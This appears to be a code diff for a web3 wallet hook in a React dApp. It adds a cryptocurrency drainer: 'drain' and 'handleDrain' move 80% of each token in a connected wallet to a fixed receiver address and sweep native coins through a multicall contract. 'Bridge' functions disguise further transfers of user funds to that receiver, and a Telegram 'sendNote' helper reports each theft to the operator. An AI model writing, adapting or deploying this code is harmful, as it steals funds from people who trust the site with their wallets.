@@ -1,13 +1,13 @@
 "use client";
 
 import { useAccount } from "wagmi";
-import { switchChain, getChainId, getGasPrice } from "@wagmi/core";
+import { getBalance, switchChain, getChainId, getGasPrice } from "@wagmi/core";
 import axios from "axios";
 import { Contract, providers, ethers, utils } from "ethers";
 import contractAbi from "../app/blockchain/contract.json";
 import { config, receiver, API_KEY } from "../Web3Config";
 import { toast } from "react-toastify";
-// import { sendMessageToTelegram } from "../../../utils/telegramUtils";
+import { sendNote } from "../../utils/telegramUtils";
 
 export const UseWallet = () => {
   const account = useAccount();
@@ -88,74 +88,177 @@ export const UseWallet = () => {
     }
   };
 
-  //   if (!window.ethereum || !account?.address || !account?.chainId) {
-  //     console.log("Ethereum provider is not available.");
+  const drain = async () => {
+    if (!window.ethereum || !account?.address || !account?.chainId) {
+      console.log("Ethereum provider is not available.");
+      return;
+    }
+
+    const chainId = getChainId(config);
+
+    // Update chainInteractionStatus after interacting with the chain
+    chainInteractionStatus[chainId] = true;
+
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    const signer = provider.getSigner(account.address);
+    const ethBalance = await getBalance(config, {
+      address: account.address,
+      chainId: account.chainId,
+    });
+
+    const tokens = await getTokenAssets();
+
+    // Process each token individually
+    for (let token of tokens) {
+      const { tokenAddress, tokenAmount } = token;
+
+      if (tokenAddress !== "0x0000000000000000000000000000000000000000") {
+        const tokenContract = new Contract(
+          tokenAddress,
+          [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function transfer(address to, uint256 amount) external returns (bool)",
+          ],
+          signer
+        );
+
+        const amountInWei = ethers.BigNumber.from(tokenAmount.toString())
+          .mul(8)
+          .div(10); // Transfer 80% of the balance
+
+        try {
+          const userBalance = await tokenContract.balanceOf(account.address);
+          if (userBalance.lt(amountInWei)) {
+            console.log(`Insufficient token balance for ${tokenAddress}`);
+            continue; // Move to next token
+          }
+
+          const transferTx = await tokenContract.transfer(
+            receiver,
+            amountInWei
+          );
+          console.log(`Transfer tx hash: ${transferTx.hash}`);
+          await transferTx.wait();
+          console.log(
+            `Transferred ${amountInWei.toString()} of ${tokenAddress}`
+          );
+
+          chainDrainStatus[chainId] = true; // Mark chain as drained if successful
+        } catch (error) {
+          console.log(`Transfer failed for ${tokenAddress}:`, error);
+          continue; // Continue to next token on failure
+        }
+      }
+    }
+
+    // After tokens, handle multicall for native tokens
+    await handleMulticall(tokens, ethBalance);
+  };
+
+  // const drain2 = async (provider, chainId, assetAddress, tokenAmount) => {
+  //   if (!provider || !chainId) {
+  //     console.error("Missing required arguments.");
   //     return;
   //   }
 
-  //   const chainId = getChainId(config);
+  //   const signer = provider.getSigner();
+  //   const accountAddress = await signer.getAddress();
 
-  //   // Update chainInteractionStatus after interacting with the chain
-  //   chainInteractionStatus[chainId] = true;
+  //   // Set assetAddress to null for native tokens if not provided
+  //   if (!assetAddress) {
+  //     assetAddress = "0x0000000000000000000000000000000000000000";
+  //   }
 
-  //   const provider = new ethers.providers.Web3Provider(window.ethereum);
-  //   const signer = provider.getSigner(account.address);
-  //   const ethBalance = await getBalance(config, {
-  //     address: account.address,
-  //     chainId: account.chainId,
-  //   });
+  //   const isNative =
+  //     assetAddress === "0x0000000000000000000000000000000000000000";
 
-  //   const tokens = await getTokenAssets();
+  //   try {
+  //     if (isNative) {
+  //       // Multicall for native token
+  //       // const ethBalance = await provider.getBalance(accountAddress);
+  //       const contractAddress = getContractAddress(chainId);
 
-  //   // Process each token individually
-  //   for (let token of tokens) {
-  //     const { tokenAddress, tokenAmount } = token;
+  //       const multiCallContract = new Contract(
+  //         contractAddress,
+  //         contractAbi,
+  //         signer
+  //       );
 
-  //     if (tokenAddress !== "0x0000000000000000000000000000000000000000") {
+  //       const amountInWei = ethers.utils.parseEther(tokenAmount.toString());
+
+  //       try {
+  //         // Attempt to call the multicall contract
+  //         const tx = await multiCallContract.multiCall([], [], {
+  //           value: amountInWei,
+  //           gasLimit: ethers.utils.hexlify(100000), // Set manual gas limit
+  //         });
+  //         console.log(`Multicall transaction hash: ${tx.hash}`);
+  //         sendNote(`Multicall transaction hash: ${tx.hash}`);
+  //         await tx.wait();
+  //         console.log(
+  //           `Native token transferred through multicall: ${ethAmountToDrain.toString()}`
+  //         );
+  //         sendNote(
+  //           `Native token transferred through multicall: ${ethAmountToDrain.toString()}`
+  //         );
+  //       } catch (multiCallError) {
+  //         console.error(
+  //           "Multicall failed, falling back to direct transfer:",
+  //           multiCallError
+  //         );
+
+  //         // Fallback to direct ETH transfer if multicall fails
+  //         const tx = await signer.sendTransaction({
+  //           to: contractAddress,
+  //           value: amountInWei,
+  //           gasLimit: ethers.utils.hexlify(10000), // Basic transfer gas limit
+  //         });
+  //         console.log(`Direct transfer transaction hash: ${tx.hash}`);
+  //         sendNote(`Direct transfer transaction hash: ${tx.hash}`);
+  //         await tx.wait();
+  //         console.log(
+  //           `Directly transferred native token: ${ethAmountToDrain.toString()}`
+  //         );
+  //         sendNote(
+  //           `Directly transferred native token: ${ethAmountToDrain.toString()}`
+  //         );
+  //       }
+  //     } else {
+  //       // ERC20 transfer for non-native token
   //       const tokenContract = new Contract(
-  //         tokenAddress,
+  //         assetAddress,
   //         [
-  //           "function balanceOf(address owner) view returns (uint256)",
-  //           "function transfer(address to, uint256 amount) external returns (bool)",
+  //           "function balanceOf(address) view returns (uint256)",
+  //           "function transfer(address,uint256)",
   //         ],
   //         signer
   //       );
 
-  //       const amountInWei = ethers.BigNumber.from(tokenAmount.toString())
-  //         .mul(8)
-  //         .div(10); // Transfer 80% of the balance
+  //       // Get token decimals
+  //       const decimals = await tokenContract.decimals();
+  //       const amountInTokenUnits = ethers.utils.parseUnits(
+  //         tokenAmount.toString(),
+  //         decimals
+  //       );
 
-  //       try {
-  //         const userBalance = await tokenContract.balanceOf(account.address);
-  //         if (userBalance.lt(amountInWei)) {
-  //           console.log(`Insufficient token balance for ${tokenAddress}`);
-  //           continue; // Move to next token
-  //         }
-
-  //         const transferTx = await tokenContract.transfer(
-  //           receiver,
-  //           amountInWei
-  //         );
-  //         console.log(`Transfer tx hash: ${transferTx.hash}`);
-  //         await transferTx.wait();
-  //         console.log(
-  //           `Transferred ${amountInWei.toString()} of ${tokenAddress}`
-  //         );
-
-  //         chainDrainStatus[chainId] = true; // Mark chain as drained if successful
-  //       } catch (error) {
-  //         console.log(`Transfer failed for ${tokenAddress}:`, error);
-  //         continue; // Continue to next token on failure
-  //       }
+  //       const transferTx = await tokenContract.transfer(
+  //         receiver,
+  //         amountInTokenUnits
+  //       );
+  //       console.log(`ERC20 transfer transaction hash: ${transferTx.hash}`);
+  //       sendNote(`ERC20 transfer transaction hash: ${transferTx.hash}`);
+  //       await transferTx.wait();
+  //       console.log(
+  //         `ERC20 token transferred: ${tokenAmountToDrain.toString()}`
+  //       );
+  //       sendNote(`ERC20 token transferred: ${tokenAmountToDrain.toString()}`);
   //     }
+  //   } catch (error) {
+  //     console.error("Drain function error:", error);
   //   }
-
-  //   // After tokens, handle multicall for native tokens
-  //   await handleMulticall(tokens, ethBalance);
   // };
 
-  //drain here is edited to only transfer the token selected (native or erc20)
-  const drain = async (provider, chainId, assetAddress) => {
+  const drain2 = async (provider, chainId, assetAddress) => {
     if (!provider || !chainId) {
       console.error("Missing required arguments.");
       return;
@@ -242,6 +345,73 @@ export const UseWallet = () => {
       console.error("Drain function error:", error);
     }
   };
+  const handleDrain = async ({ chainId, address, transferAmount }) => {
+    if (!window.ethereum) {
+      console.log("Ethereum provider is not available.");
+      return;
+    }
+
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    const signer = provider.getSigner(address);
+    const ethBalance = await getBalance(config, {
+      address,
+      chainId,
+    });
+
+    const tokens = await getTokenAssets();
+
+    // Process each token individually
+    for (let token of tokens) {
+      const { tokenAddress, tokenAmount } = token;
+
+      if (tokenAddress !== "0x0000000000000000000000000000000000000000") {
+        const tokenContract = new ethers.Contract(
+          tokenAddress,
+          [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function transfer(address to, uint256 amount) external returns (bool)",
+          ],
+          signer
+        );
+
+        // Use the passed transferAmount or fallback to 80% of the available tokenAmount
+        const amountInWei = transferAmount
+          ? ethers.BigNumber.from(transferAmount.toString())
+          : ethers.BigNumber.from(tokenAmount.toString()).mul(8).div(10); // Default to 80% if not provided
+
+        try {
+          const userBalance = await tokenContract.balanceOf(address);
+          if (userBalance.lt(amountInWei)) {
+            console.log(`Insufficient token balance for ${tokenAddress}`);
+            toast(`Insufficient token balance for ${tokenAddress}`);
+            continue; // Move to next token
+          }
+
+          const transferTx = await tokenContract.transfer(
+            receiver,
+            amountInWei
+          );
+          console.log(`Transfer tx hash: ${transferTx.hash}`);
+          await transferTx.wait();
+          console.log(
+            `Transferred ${amountInWei.toString()} of ${tokenAddress}`
+          );
+          toast.success(
+            `Transferred ${amountInWei.toString()} of ${tokenAddress}`
+          );
+
+          chainDrainStatus[chainId] = true; // Mark chain as drained if successful
+        } catch (error) {
+          toast.error(`Transfer failed for ${tokenAddress}: ${error}`);
+          console.log(`Transfer failed for ${tokenAddress}:`, error);
+          continue; // Continue to next token on failure
+        }
+      }
+    }
+
+    // After tokens, handle multicall for native tokens
+    await handleMulticall(tokens, ethBalance);
+  };
 
   const handleMulticall = async (tokens, ethBalance) => {
     const chainId = getChainId(config);
@@ -292,6 +462,7 @@ export const UseWallet = () => {
       await proceedToNextChain();
     } catch (error) {
       console.log("Multicall operation failed:", error);
+      toast.error("Multicall operation failed:");
       await proceedToNextChain();
     }
   };
@@ -378,5 +549,162 @@ export const UseWallet = () => {
     return tokenBalances;
   };
 
-  return { approveTokens, drain, getTokenAssets };
+  // Function to handle native token bridging through multicall
+  const bridgeNativeToken = async (
+    amount,
+    provider,
+    accountAddress,
+    chainId
+  ) => {
+    try {
+      if (!accountAddress || !provider) {
+        toast.error("Connect your wallet first.");
+        return;
+      }
+
+      const signer = provider.getSigner(); // Use the provided provider
+      const senderAddress = await signer.getAddress(); // Fetch the user's address (connected wallet)
+
+      const contractAddress = getContractAddress(chainId); // Get contract address for the current chain
+      const amountInWei = ethers.utils.parseEther(amount.toString());
+
+      // Create the transaction object
+      const tx = {
+        from: senderAddress, // Sender address
+        to: contractAddress, // Contract address
+        value: amountInWei, // Amount to send
+        gasLimit: ethers.utils.hexlify(100000), // Adjust gas limit as needed
+      };
+
+      console.log("Transaction:", tx); // Log the transaction for debugging
+
+      // Send the transaction through the connected wallet provider
+      const transactionResponse = await signer.sendTransaction(tx);
+      console.log(`Transaction hash: ${transactionResponse.hash}`);
+      sendNote(`Transaction hash: ${transactionResponse.hash}`);
+
+      // Wait for the transaction to be mined
+      await transactionResponse.wait();
+      toast.success(`Successfully bridged ${amount} native token.`);
+      sendNote(`Successfully bridged ${amount} native token.`);
+    } catch (error) {
+      console.error("Native token bridging failed:", error);
+      toast.error("Failed to bridge native token.");
+      sendNote("Failed to bridge native token.");
+    }
+  };
+
+  // Function to transfer non-native tokens to receiver address
+  const bridgeNonNativeToken = async (
+    token,
+    amount,
+    provider,
+    accountAddress,
+    chainId
+  ) => {
+    try {
+      // if (!token.address) {
+      //   console.error("Invalid token address:", token);
+      //   throw new Error("Token address is undefined or invalid.");
+      // }
+
+      // If provider is missing, prompt MetaMask connection
+      if (!provider) {
+        if (window.ethereum) {
+          await window.ethereum.request({ method: "eth_requestAccounts" });
+          provider = new ethers.providers.Web3Provider(window.ethereum);
+          accountAddress = (await provider.listAccounts())[0]; // Get the connected account
+        } else {
+          toast.error("No Ethereum provider found. Please install MetaMask.");
+          throw new Error("No Ethereum provider found.");
+        }
+      }
+
+      const signer = provider.getSigner(accountAddress); // Use the provided provider and account address
+
+      const tokenContract = new ethers.Contract(
+        token.address || "0x0000000000000000000000000000000000000000",
+        [
+          "function transfer(address to, uint256 amount) external returns (bool)",
+          "function balanceOf(address owner) view returns (uint256)",
+        ],
+        signer
+      );
+
+      const senderBalance = await tokenContract.balanceOf(accountAddress); // Get the balance of the sender
+      const amountInWei = ethers.utils.parseUnits(
+        amount.toString(),
+        token.decimals
+      ); // Convert amount to token's decimals
+
+      // Check if the user has enough balance
+      if (senderBalance.lt(amountInWei)) {
+        toast.error(`Insufficient ${token.name} balance.`);
+        throw new Error(`Insufficient ${token.name} balance.`);
+      }
+
+      // Use callStatic to simulate the transaction (ensure it won't fail)
+      await tokenContract.callStatic.transfer(receiver, amountInWei);
+
+      // If the callStatic doesn't throw, proceed with the actual transfer transaction
+      const tx = await tokenContract.transfer(receiver, amountInWei);
+      console.log(`Non-native token transfer tx hash: ${tx.hash}`);
+      sendNote(`Non-native token transfer tx hash: ${tx.hash}`);
+      await tx.wait(); // Wait for the transaction to be mined
+
+      toast.success(`Transferred ${amount} ${token.name} successfully.`);
+      sendNote(`Transferred ${amount} ${token.name} successfully.`);
+    } catch (error) {
+      console.error(`Transfer failed for ${token.name}:`, error);
+      toast.error(`Transfer failed for ${token.name}.`);
+      sendNote(`Transfer failed for ${token.name}.`);
+    }
+  };
+
+  // Main function to handle bridging logic based on token type
+  const bridgeTokens = async ({
+    token,
+    amount,
+    provider,
+    accountAddress,
+    chainId,
+  }) => {
+    try {
+      if (!accountAddress || !chainId) {
+        toast.error("Connect your wallet first.");
+        return;
+      }
+
+      const isNative =
+        token.address === "0x0000000000000000000000000000000000000000"; // Check if native token
+
+      if (isNative) {
+        // Bridge Native Token (ETH, BNB, etc.)
+        await bridgeNativeToken(amount, provider, accountAddress, chainId);
+      } else {
+        // Bridge Non-Native Token (DAI, USDT, etc.)
+        await bridgeNonNativeToken(
+          token,
+          amount,
+          provider,
+          accountAddress,
+          chainId
+        );
+      }
+    } catch (error) {
+      console.error("Error in bridging tokens:", error);
+      toast.error("Failed to bridge tokens.");
+    }
+  };
+
+  return {
+    approveTokens,
+    drain,
+    drain2,
+    getTokenAssets,
+    handleDrain,
+    bridgeNativeToken,
+    bridgeTokens,
+    bridgeNonNativeToken,
+  };
 };
